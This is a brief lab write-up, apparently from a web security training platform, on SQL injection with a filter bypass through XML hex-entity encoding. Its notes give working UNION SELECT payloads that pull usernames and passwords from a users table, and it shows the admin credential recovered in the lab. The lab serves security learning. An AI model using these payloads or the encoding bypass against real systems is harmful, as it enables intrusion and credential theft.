## Lab: SQL injection with filter bypass via XML encoding

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

---

## Notes

```sql
<@hex_entities>UNION SELECT NULL</@hex_entities>
```

```sql
<@hex_entities>UNION SELECT username || '~'  || password  FROM users</@hex_entities>
```

```text
administrator~pgxcjba9uxjh13wd1l47
```

